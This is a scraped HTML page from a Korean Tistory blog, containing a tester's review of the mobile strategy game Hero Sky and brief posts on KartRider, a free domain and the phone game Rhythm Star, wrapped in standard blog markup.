wmode="transparent"  type="application/x-shockwave-flash"  EnableContextMenu="false"  FlashVars="&amp;callbackId=smblogtistorycom426981&amp;host=http://smblog.tistory.com&amp;embedCodeSrc=http%3A%2F%2Fsmblog.tistory.com%2Fplugin%2FCallBack_bootstrapper%3F%26src%3Dhttp%3A%2F%2Fs1.daumcdn.net%2Fcfs.tistory%2Fresource%2F437%2Fblog%2Fplugins%2FCallBack%2Fcallback%26id%3D42%26callbackId%3Dsmblogtistorycom426981%26destDocId%3Dcallbacknestsmblogtistorycom426981%26host%3Dhttp%3A%2F%2Fsmblog.tistory.com%26float%3Dleft" swLiveConnect="true"/></span></p><p  style="text-align: center; clear: none; float: none;"></p><p ><span style="font-family: Dotum, 돋움;">&nbsp;우선</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">처음 시작인 튜토리얼이 인상적이다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;"><span style="color: rgb(255, 0, 0);">영웅</span>이 등장하고 강력한 한 방으로 적진을 파괴하는 모습이 이 게임만의 진가를 보여주는 듯 했다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">이렇듯이 영웅이 전투에서 미치는 영향이 크게 작용하다 보니 영웅을 뽑기 위해서 젬</span><span  style="font-family: Dotum, 돋움;">(</span><span style="font-family: Dotum, 돋움;">캐쉬</span><span  style="font-family: Dotum, 돋움;">)</span><span style="font-family: Dotum, 돋움;">을 계속적으로 사용하고 싶은 충동에 빠지게 되는 것 같다</span><span  style="font-family: Dotum, 돋움;">. But!&nbsp;<span style="color: rgb(255, 0, 0);">12</span></span><span style="font-family: Dotum, 돋움;"><span style="color: rgb(255, 0, 0);">시간마다 무료 뽑기</span>가 가능하니</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">유혹을 뿌리치고 <u>건축가의 집</u>을
+짓는 것을 추천한다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">영웅을 강하게 하는 방법은 좋은 장비를 얻고</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">레벨을
+올려 진화를 통해 더 높은 등급을 만들면 된다</span><span ><span style="font-family: Dotum, 돋움;">.</span></span></p><p ><br /></p><p ><br /></p><p ><br /></p><p ><br /></p><p  style="text-align: center; clear: none; float: none;"><span class="imageblock" style="display:inline-block;width:500px;font-size: 9pt; line-height: 1.5; text-align: center; background-color: transparent;;height:auto"><img src="http://cfile4.uf.tistory.com/image/2431303753EC118331414E"  height="300" style="font-size: 9pt; line-height: 1.5; text-align: center; background-color: transparent;" width="500"/></span></p><p ><span  style="font-family: Dotum, 돋움;">&nbsp;</span></p><p ><span style="font-family: Dotum, 돋움;">&nbsp;마을은 제목에서처럼 하늘에서 펼쳐지게 된다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">건물을 건설할 때는 흔히들
+말하는</span><span  style="font-family: Dotum, 돋움;"> CoC</span><span style="font-family: Dotum, 돋움;">류의 게임과 비슷하게 <u>방어적으로 배치</u>해야 한다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;"><u>마을회관을
+업그레이드</u> 하면 건설할 수 있는 건물의 종류가 늘어나니 최우선적으로 업그레이드를 하는 것이 전략적인 요소 중 하나이다</span><span ><span style="font-family: Dotum, 돋움;">.</span></span></p><p ><span  style="font-family: Dotum, 돋움;">&nbsp;</span></p><p ><span  style="font-family: Dotum, 돋움;"><br /></span></p><p ><br /></p><p ><br /></p><p  style="text-align: center; clear: none; float: none;"><span class="imageblock" style="display:inline-block;width:300px;;height:auto"><img src="http://cfile27.uf.tistory.com/image/2451964753EC0540072629" style="cursor: pointer;" onclick="open_img('http://cfile27.uf.tistory.com/original/2451964753EC0540072629')"  height="180" style="" width="300" /></span>&nbsp;<span class="imageblock" style="display:inline-block;width:300px;font-size: 9pt; line-height: 1.5;;height:auto"><img src="http://cfile25.uf.tistory.com/image/2738094E53EC05C6222043" style="cursor: pointer;" onclick="open_img('http://cfile25.uf.tistory.com/original/2738094E53EC05C6222043')"  height="180" style="font-size: 9pt; line-height: 1.5;" width="300" /></span></p><p  style="text-align: center; clear: none; float: none;"><br /></p><p ><span style="font-family: Dotum, 돋움;">&nbsp;전투는 <b>미션</b></span><b><span  style="font-family: Dotum, 돋움;">(</span><span style="font-family: Dotum, 돋움;">싱글</span><span  style="font-family: Dotum, 돋움;">)</span></b><span style="font-family: Dotum, 돋움;">과 <b>상대
+찾기</b></span><b><span  style="font-family: Dotum, 돋움;">(</span><span style="font-family: Dotum, 돋움;">멀티</span><span  style="font-family: Dotum, 돋움;">)</span></b><span style="font-family: Dotum, 돋움;">를 지원한다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">적재적소에
+병사를 배치하고 영웅의 스킬을 적절히 사용해야 승리로 이끌 수 있다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;"><span style="color: rgb(255, 0, 0);">죽지 않은 병사는 다음 전투에도
+계속 참전할 수 있다는 점</span>이 히어로 스카이의 가장 큰 장점 중에 하나이다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">그리고 다소 전투가 길어지는
+점을 감안하여 </span><span  style="font-family: Dotum, 돋움; color: rgb(255, 0, 0);">2</span><span style="font-family: Dotum, 돋움;"><span style="color: rgb(255, 0, 0);">배 속</span>도 지원하니 적극 활용하는 것을 추천한다</span><span  style="font-family: Dotum, 돋움;">. (</span><span style="font-family: Dotum, 돋움;">다시보기는</span><span  style="font-family: Dotum, 돋움;"> 4</span><span style="font-family: Dotum, 돋움;">배속까지 지원한다</span><span  style="font-family: Dotum, 돋움;">.) </span><span style="font-family: Dotum, 돋움;">반면</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">영웅이
+데미지를 입으면 회복을 해야 전투에 참전이 가능하니 주의</span><span ><span style="font-family: Dotum, 돋움;">!</span></span></p><p ><br /></p><p ><span style="font-family: Dotum, 돋움;">&nbsp;미션 중에서 특이한 점은 내 마을 방어 미션이다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">다른 유저가 공격해
+오기도 하지만</span><span  style="font-family: Dotum, 돋움;">, AI</span><span style="font-family: Dotum, 돋움;">도 들어오는 점이 색다른데</span><span  style="font-family: Dotum, 돋움;">, </span><span style="font-family: Dotum, 돋움;">이렇듯 마을을
+<u>전략적으로 배치</u>해야 승리로 이끌 수 있다</span><span ><span style="font-family: Dotum, 돋움;">.</span></span></p><p ><span  style="font-family: Dotum, 돋움;">&nbsp;</span></p><p ><span  style="font-family: Dotum, 돋움;"><br /></span></p><p ><br /></p><p ><br /></p><p  style="text-align: center; clear: none; float: none;"><span class="imageblock" style="display:inline-block;width:500px;;height:auto"><img src="http://cfile24.uf.tistory.com/image/2679FE3C53EC1195278430"  height="300" style="" width="500"/></span></p><p ><br /></p><p ><span style="font-family: Dotum, 돋움;">&nbsp;그리고 전투 중에 가장 재미있었던 내용은 <b>트로이 목마</b> 시스템이었다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">견고한
+벽으로 둘러싸인 상대를 공략하기 위해서는 적 한 가운데로 트로이 목마를 배치하면 허를 찌를 수 있다</span><span  style="font-family: Dotum, 돋움;">. </span><span style="font-family: Dotum, 돋움;">트로이
+목마를 활용하여 안과 밖에서 동시에 몰아치다 보면 쉽게 승리로 이끌어 낼 수 있을 것이다</span><span ><span style="font-family: Dotum, 돋움;">.</span></span></p><p ><span  style="font-family: Dotum, 돋움;">&nbsp;</span></p><p ><br /></p><p ><font face="Dotum, 돋움">&nbsp;아직&nbsp;</font><span style="font-size: 9pt; line-height: 1.5; font-family: Dotum, 돋움; background-color: transparent;">아쉬운 점은 아직 길드전이 없고</span><span  style="font-size: 9pt; line-height: 1.5; font-family: Dotum, 돋움; background-color: transparent;">, 길드원에게&nbsp;</span><span style="font-size: 9pt; line-height: 1.5; font-family: Dotum, 돋움; background-color: transparent;">지원해 줄 수 있는 시스템이 없다</span><span  style="font-size: 9pt; line-height: 1.5; font-family: Dotum, 돋움; background-color: transparent;">. 이는&nbsp;</span><span style="font-size: 9pt; line-height: 1.5; font-family: Dotum, 돋움; background-color: transparent;">차후 업데이트를 기대해 보도록 해야겠다.</span></p><p ><span style="font-size: 9pt; line-height: 1.5; font-family: Dotum, 돋움; background-color: transparent;">&nbsp;그리고 공식 카페와 공식 페이스북을 자주 방문하여 새로운 소식이 있는지 알아 보는 것도 좋을 것 같다</span><span  style="font-size: 9pt; line-height: 1.5; background-color: transparent;"><span style="font-family: Dotum, 돋움;">.</span></span></p><p ><span ><span style="font-family: Dotum, 돋움;"><br /></span></span></p><p ><span ><span style="font-family: Dotum, 돋움;">공식 카페 :&nbsp;</span></span><span style="background-color: transparent;"><font face="Dotum, 돋움"><a href="http://cafe.naver.com/nexonherosky" target="_blank" class="tx-link">http://cafe.naver.com/nexonherosky</a></font></span></p><p ><span style="background-color: transparent;"><font face="Dotum, 돋움">공식 페이스북 :&nbsp;</font></span><span style="background-color: transparent;"><font face="Dotum, 돋움"><a href="https://www.facebook.com/nexonherosky" target="_blank" class="tx-link">https://www.facebook.com/nexonherosky</a></font></span></p><p ><span style="background-color: transparent;"><font face="Dotum, 돋움"><br /></font></span></p><p ><span style="background-color: transparent;"><font face="Dotum, 돋움"><br /></font></span></p><p  style="text-align: right;"><span style="background-color: transparent;"><font face="Dotum, 돋움">작성자 : 크리스탈</font></span></p><p  style="text-align: right;"><span style="background-color: transparent;"><font face="Dotum, 돋움">(넥슨 모바일게임 체험단 2기)</font></span></p><p  style="text-align: right;"><span style="background-color: transparent;"><font face="Dotum, 돋움">이메일 : smpray4u@nate.com</font></span></p><div class="entry-ccl" style="clear: both; text-align: right; margin-bottom: 10px">
+	<a href="http://creativecommons.org/licenses/by-nc-nd/4.0/deed.ko" target="_blank" style="text-decoration: none">
+	<img id="ccl-icon-42-0" class="entry-ccl-by" src="http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/editor/ccl_black01.png" onmouseover="tistoryCcl.show(this, 1)" onmouseout="tistoryCcl.hide()" alt="저작자 표시"/>
+	<img id="ccl-icon-42-1" class="entry-ccl-nc" src="http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/editor/ccl_black02.png" onmouseover="tistoryCcl.show(this, 1)" onmouseout="tistoryCcl.hide()" alt="비영리"/>
+	<img id="ccl-icon-42-2" class="entry-ccl-nd" src="http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/editor/ccl_black03.png" onmouseover="tistoryCcl.show(this, 1)" onmouseout="tistoryCcl.hide()" alt="변경 금지"/>
+	<!--
+	<rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+		<Work rdf:about="">
+			<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" />
+		</Work>
+		<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/">
+			<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+			<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+			<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+			<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+			<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+		</License>
+	</rdf:RDF>
+	-->
+	</a>
+</div>
+<script type="text/javascript">
+if(/MSIE [0-6]\./.test(navigator.userAgent)){for(var i=0;i<3;i++){var el=document.getElementById('ccl-icon-42-'+i);el.style.filter='progid:DXImageTransform.Microsoft.AlphaImageLoader(src="'+el.src+'",sizingMethod="image")';el.src='http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/form/s.gif';}}
+</script>
+<fieldset style="margin:20px 0px 20px 0px;padding:5px;"><legend><span><strong>크리에이티브 커먼즈 라이선스</strong></span></legend><!--Creative Commons License--><div style="float: left; width: 88px; margin-top: 3px;"><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" target="_blank"><img alt="Creative Commons License" style="border-width: 0" src="http://i.creativecommons.org/l/by-nc-nd/2.0/kr/88x31.png"/></a></div><div style="margin-left: 92px; margin-top: 3px; text-align: justify;">이 저작물은 <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" target="_blank">크리에이티브 커먼즈 코리아 저작자표시-비영리-변경금지 2.0 대한민국 라이선스</a>에 따라 이용하실 수 있습니다.
+			<!-- Creative Commons License-->
+			<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+			<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" />
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/">
+			<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+			<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+			<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+			<requires rdf:resource="http://web.resource.org/cc/Attribution"/><prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/></License></rdf:RDF> --></div></fieldset></div>
+										</div>
+										<!-- close article -->
+										<div class="author">
+											<span class="text">posted by</span>
+											리뷰어 [크리스탈]
+										</div>
+										<!-- 태그트레일 -->
+										
+											<div class="tagTrail">
+												<span class="tagText">TAG</span>
+												<a href="/tag/HeroSky" >HeroSky</a>,
+<a href="/tag/Innospark" >Innospark</a>,
+<a href="/tag/NEXON" >NEXON</a>,
+<a href="/tag/넥슨" >넥슨</a>,
+<a href="/tag/리뷰" >리뷰</a>,
+<a href="/tag/모바일게임" >모바일게임</a>,
+<a href="/tag/스마트폰게임" >스마트폰게임</a>,
+<a href="/tag/영웅" >영웅</a>,
+<a href="/tag/이노스파크" >이노스파크</a>,
+<a href="/tag/크리스탈" >크리스탈</a>,
+<a href="/tag/토르" >토르</a>,
+<a href="/tag/히어로스카이" >히어로스카이</a>
+											</div>
+											<!-- close tagTrail -->
+										
+										<div class="actionTrail">
+											<a href="#tb" onclick="toggleLayerForEntry(42, 'trackback'); return false" title="트랙백" class="wrapTrackback">
+												<span id="trackbackCount42">트랙백 <span class="cnt">0</span>개</span>
+											</a>
+											<a href="#rp" onclick="toggleLayerForEntry('42', 'comment'); return false" title="댓글" class="wrapComment">
+												<span id="commentCount42">댓글 <span class="cnt">0</span>개가 달렸습니다.</span>
+											</a>
+										</div>
+										<!-- 트랙백 -->
+										<div id="entry42Trackback" style="display:none">
+											<div class="trackback">
+												<h3>Trackback |<span class="url">	<span class="trackback-url" style="cursor: text">http://smblog.tistory.com/trackback/42</span>
+	<span id="TrackbackCopyHolder42" style="vertical-align: -4px; margin-left: 1px">
+	<script type="text/javascript">
+	//<![CDATA[
+	AC_FL_RunContent(
+		'src','http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/copyTrackback',
+		'Flashvars','url=http://smblog.tistory.com/trackback/42&mode=whiteButton',
+		'width','29',
+		'height','18',
+		'id', 'TrackbackCopyButton42',
+		'wmode','transparent',
+		'allowScriptAccess','always',
+		'type','application/x-shockwave-flash',
+		'pluginspage','http://www.macromedia.com/go/getflashplayer'
+	);
+	//]]>
+	</script>
+	</span>
+	<span>
+		<a href="http://www.tistory.com/gateway/?trackback=http%3A%2F%2Fsmblog.tistory.com%2Ftrackback%2F42&amp;defaultAdmin=%2Fadmin" onclick="window.open(this.href); return false">
+	<img src="http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/btn_track_white.gif" alt="관련글 쓰기" title="" style="_margin-left: 5px; vertical-align: -4px"/>
+	</a></span>
+</span></h3>
+												
+											</div>
+											<!-- close trackback -->
+										</div>
+										<div id="entry42Comment" style="display:none"></div>
+									</div>
+								</div><!-- close entry -->
+							
+								<div class="entry">
+									<div class="wrapEntryHead">
+										<span class="date">2008/08/03 14:09</span>
+										<span class="category"><a href="/category/기타">기타</a></span>
+									</div>
+									<div class="wrapEntryCnt">
+										<div class="titleWrap">
+											<h2><a href="/41">카트라이더</a></h2>
+											<!-- 포스트관리 -->
+											
+										</div>
+										<!-- close titleWrap --><!-- 포스트 본문 내용 -->
+										<div class="article">
+											<P><div class="imageblock center" style="text-align: center; clear: both;"><img src="http://cfs9.tistory.com/image/22/tistory/2008/08/03/14/14/48953eb371151" style="cursor: pointer;" onclick="open_img('http://cfs9.tistory.com/original/22/tistory/2008/08/03/14/14/48953eb371151')" alt="사용자 삽입 이미지" height="480" width="600" /></div> </P>
+<P style="TEXT-ALIGN: center"><br /><span id="callbacknestsmblogtistorycom417244" style="width:1px; height:1px; float:right"><embed  allowscriptaccess="always"  id="bootstrappersmblogtistorycom417244"  src="http://smblog.tistory.com/plugin/CallBack_bootstrapperSrc?nil_profile=tistory&amp;nil_type=copied_post"  width="1"  height="1"  wmode="transparent"  type="application/x-shockwave-flash"  EnableContextMenu="false"  FlashVars="&amp;callbackId=smblogtistorycom417244&amp;host=http://smblog.tistory.com&amp;embedCodeSrc=http%3A%2F%2Fsmblog.tistory.com%2Fplugin%2FCallBack_bootstrapper%3F%26src%3Dhttp%3A%2F%2Fs1.daumcdn.net%2Fcfs.tistory%2Fresource%2F437%2Fblog%2Fplugins%2FCallBack%2Fcallback%26id%3D41%26callbackId%3Dsmblogtistorycom417244%26destDocId%3Dcallbacknestsmblogtistorycom417244%26host%3Dhttp%3A%2F%2Fsmblog.tistory.com%26float%3Dleft" swLiveConnect="true"/></span>카트 10000전 달성했구나~~ ㅋㅋ</P><fieldset style="margin:20px 0px 20px 0px;padding:5px;"><legend><span><strong>크리에이티브 커먼즈 라이선스</strong></span></legend><!--Creative Commons License--><div style="float: left; width: 88px; margin-top: 3px;"><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" target="_blank"><img alt="Creative Commons License" style="border-width: 0" src="http://i.creativecommons.org/l/by-nc-nd/2.0/kr/88x31.png"/></a></div><div style="margin-left: 92px; margin-top: 3px; text-align: justify;">이 저작물은 <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" target="_blank">크리에이티브 커먼즈 코리아 저작자표시-비영리-변경금지 2.0 대한민국 라이선스</a>에 따라 이용하실 수 있습니다.
+			<!-- Creative Commons License-->
+			<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+			<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" />
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/">
+			<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+			<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+			<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+			<requires rdf:resource="http://web.resource.org/cc/Attribution"/><prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/></License></rdf:RDF> --></div></fieldset>
+										</div>
+										<!-- close article -->
+										<div class="author">
+											<span class="text">posted by</span>
+											리뷰어 [크리스탈]
+										</div>
+										<!-- 태그트레일 -->
+										
+											<div class="tagTrail">
+												<span class="tagText">TAG</span>
+												<a href="/tag/넥슨" >넥슨</a>,
+<a href="/tag/카트" >카트</a>,
+<a href="/tag/카트라이더" >카트라이더</a>
+											</div>
+											<!-- close tagTrail -->
+										
+										<div class="actionTrail">
+											<a href="#tb" onclick="toggleLayerForEntry(41, 'trackback'); return false" title="트랙백" class="wrapTrackback">
+												<span id="trackbackCount41">트랙백 <span class="cnt">0</span>개</span>
+											</a>
+											<a href="#rp" onclick="toggleLayerForEntry('41', 'comment'); return false" title="댓글" class="wrapComment">
+												<span id="commentCount41">댓글 <span class="cnt">0</span>개가 달렸습니다.</span>
+											</a>
+										</div>
+										<!-- 트랙백 -->
+										<div id="entry41Trackback" style="display:none">
+											<div class="trackback">
+												<h3>Trackback |<span class="url">	<span class="trackback-url" style="cursor: text">http://smblog.tistory.com/trackback/41</span>
+	<span id="TrackbackCopyHolder41" style="vertical-align: -4px; margin-left: 1px">
+	<script type="text/javascript">
+	//<![CDATA[
+	AC_FL_RunContent(
+		'src','http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/copyTrackback',
+		'Flashvars','url=http://smblog.tistory.com/trackback/41&mode=whiteButton',
+		'width','29',
+		'height','18',
+		'id', 'TrackbackCopyButton41',
+		'wmode','transparent',
+		'allowScriptAccess','always',
+		'type','application/x-shockwave-flash',
+		'pluginspage','http://www.macromedia.com/go/getflashplayer'
+	);
+	//]]>
+	</script>
+	</span>
+	<span>
+		<a href="http://www.tistory.com/gateway/?trackback=http%3A%2F%2Fsmblog.tistory.com%2Ftrackback%2F41&amp;defaultAdmin=%2Fadmin" onclick="window.open(this.href); return false">
+	<img src="http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/btn_track_white.gif" alt="관련글 쓰기" title="" style="_margin-left: 5px; vertical-align: -4px"/>
+	</a></span>
+</span></h3>
+												
+											</div>
+											<!-- close trackback -->
+										</div>
+										<div id="entry41Comment" style="display:none"></div>
+									</div>
+								</div><!-- close entry -->
+							
+								<div class="entry">
+									<div class="wrapEntryHead">
+										<span class="date">2008/08/02 22:48</span>
+										<span class="category"><a href="/category/기타">기타</a></span>
+									</div>
+									<div class="wrapEntryCnt">
+										<div class="titleWrap">
+											<h2><a href="/38">무료도메인</a></h2>
+											<!-- 포스트관리 -->
+											
+										</div>
+										<!-- close titleWrap --><!-- 포스트 본문 내용 -->
+										<div class="article">
+											<A href="http://smblog.ba.ro/" target=_blank>
+<P><A href="http://smblog.ba.ro/">http://smblog.ba.ro</A><br /><span id="callbacknestsmblogtistorycom38202" style="width:1px; height:1px; float:right"><embed  allowscriptaccess="always"  id="bootstrappersmblogtistorycom38202"  src="http://smblog.tistory.com/plugin/CallBack_bootstrapperSrc?nil_profile=tistory&amp;nil_type=copied_post"  width="1"  height="1"  wmode="transparent"  type="application/x-shockwave-flash"  EnableContextMenu="false"  FlashVars="&amp;callbackId=smblogtistorycom38202&amp;host=http://smblog.tistory.com&amp;embedCodeSrc=http%3A%2F%2Fsmblog.tistory.com%2Fplugin%2FCallBack_bootstrapper%3F%26src%3Dhttp%3A%2F%2Fs1.daumcdn.net%2Fcfs.tistory%2Fresource%2F437%2Fblog%2Fplugins%2FCallBack%2Fcallback%26id%3D38%26callbackId%3Dsmblogtistorycom38202%26destDocId%3Dcallbacknestsmblogtistorycom38202%26host%3Dhttp%3A%2F%2Fsmblog.tistory.com%26float%3Dleft" swLiveConnect="true"/></span><A href="http://smblog.tistory.com/">http://smblog.tistory.com</A><br /><br />주소를 새롭게 만들었다 ㅋㅋ<br />둘 다 사용가능하지만 당연히 짧은게 좋은거 같다~<br />더욱이 무료도메인이라서 굳 +_+b<br />만드는 곳은 아래 링크~<br /><A href="http://www.ba.ro/html_ko/main.htm">http://www.ba.ro/html_ko/main.htm</A></P><fieldset style="margin:20px 0px 20px 0px;padding:5px;"><legend><span><strong>크리에이티브 커먼즈 라이선스</strong></span></legend><!--Creative Commons License--><div style="float: left; width: 88px; margin-top: 3px;"><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" target="_blank"><img alt="Creative Commons License" style="border-width: 0" src="http://i.creativecommons.org/l/by-nc-nd/2.0/kr/88x31.png"/></a></div><div style="margin-left: 92px; margin-top: 3px; text-align: justify;">이 저작물은 <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" target="_blank">크리에이티브 커먼즈 코리아 저작자표시-비영리-변경금지 2.0 대한민국 라이선스</a>에 따라 이용하실 수 있습니다.
+			<!-- Creative Commons License-->
+			<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+			<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.0/kr/" />
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/">
+			<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+			<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+			<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+			<requires rdf:resource="http://web.resource.org/cc/Attribution"/><prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/></License></rdf:RDF> --></div></fieldset>
+										</div>
+										<!-- close article -->
+										<div class="author">
+											<span class="text">posted by</span>
+											리뷰어 [크리스탈]
+										</div>
+										<!-- 태그트레일 -->
+										
+											<div class="tagTrail">
+												<span class="tagText">TAG</span>
+												<a href="/tag/ba.ro" >ba.ro</a>,
+<a href="/tag/도메인" >도메인</a>,
+<a href="/tag/무료도메인" >무료도메인</a>,
+<a href="/tag/바로" >바로</a>,
+<a href="/tag/주소" >주소</a>
+											</div>
+											<!-- close tagTrail -->
+										
+										<div class="actionTrail">
+											<a href="#tb" onclick="toggleLayerForEntry(38, 'trackback'); return false" title="트랙백" class="wrapTrackback">
+												<span id="trackbackCount38">트랙백 <span class="cnt">0</span>개</span>
+											</a>
+											<a href="#rp" onclick="toggleLayerForEntry('38', 'comment'); return false" title="댓글" class="wrapComment">
+												<span id="commentCount38">댓글 <span class="cnt">0</span>개가 달렸습니다.</span>
+											</a>
+										</div>
+										<!-- 트랙백 -->
+										<div id="entry38Trackback" style="display:none">
+											<div class="trackback">
+												<h3>Trackback |<span class="url">	<span class="trackback-url" style="cursor: text">http://smblog.tistory.com/trackback/38</span>
+	<span id="TrackbackCopyHolder38" style="vertical-align: -4px; margin-left: 1px">
+	<script type="text/javascript">
+	//<![CDATA[
+	AC_FL_RunContent(
+		'src','http://s1.daumcdn.net/cfs.tistory/resource/437/blog/script/copyTrackback',
+		'Flashvars','url=http://smblog.tistory.com/trackback/38&mode=whiteButton',
+		'width','29',
+		'height','18',
+		'id', 'TrackbackCopyButton38',
+		'wmode','transparent',
+		'allowScriptAccess','always',
+		'type','application/x-shockwave-flash',
+		'pluginspage','http://www.macromedia.com/go/getflashplayer'
+	);
+	//]]>
+	</script>
+	</span>
+	<span>
+		<a href="http://www.tistory.com/gateway/?trackback=http%3A%2F%2Fsmblog.tistory.com%2Ftrackback%2F38&amp;defaultAdmin=%2Fadmin" onclick="window.open(this.href); return false">
+	<img src="http://i1.daumcdn.net/cfs.tistory/resource/437/static/admin/btn_track_white.gif" alt="관련글 쓰기" title="" style="_margin-left: 5px; vertical-align: -4px"/>
+	</a></span>
+</span></h3>
+												
+											</div>
+											<!-- close trackback -->
+										</div>
+										<div id="entry38Comment" style="display:none"></div>
+									</div>
+								</div><!-- close entry -->
+							
+								<div class="entry">
+									<div class="wrapEntryHead">
+										<span class="date">2008/08/02 15:12</span>
+										<span class="category"><a href="/category/모바일%20게임">모바일 게임</a></span>
+									</div>
+									<div class="wrapEntryCnt">
+										<div class="titleWrap">
+											<h2><a href="/31">리듬스타</a></h2>
+											<!-- 포스트관리 -->
+											
+										</div>
+										<!-- close titleWrap --><!-- 포스트 본문 내용 -->
+										<div class="article">
+											<P align=center><IMG height=192 src="http://www.gameport.co.kr/image/game/rhythm/screen01_img01.jpg" width=144>&nbsp; <IMG height=192 src="http://www.gameport.co.kr/image/game/rhythm/screen01_img02.jpg" width=144><br />
+<br /><br />
+</P>
+<DIV style="TEXT-ALIGN: left">개인적으론 폰게임을 그만둬야겠다고 생각했을 때 나온 게임이라 흔히들 말하는 '대박'을 예상하지 못했었다.<br />
+하지만 3월 출시 이후에 현재 8월까지 1위를 유지하고 있는 게임이다.<br />
+<br /><br />
+
+<DIV style="TEXT-ALIGN: left">게임은 총 3가지 모드이다. 이지, 하드, 크레이지..<br />
+처음 접했다면 정신건강상 크레이지는 하지 말길 바란다. -_-<br />
+<br />
+<DIV style="TEXT-ALIGN: center"><IMG height=192 src="http://www.gameport.co.kr/image/game/rhythm/screen02_img34.jpg" width=144>&nbsp; <IMG height=192 src="http://www.gameport.co.kr/image/game/rhythm/screen02_img36.jpg" width=144>&nbsp; <IMG height=192 src="http://www.gameport.co.kr/image/game/rhythm/screen02_img37.jpg" width=144></DIV></DIV><br /><span id="callbacknestsmblogtistorycom312663" style="width:1px; height:1px; float:right"><embed  allowscriptaccess="always"  id="bootstrappersmblogtistorycom312663"  src="http://smblog
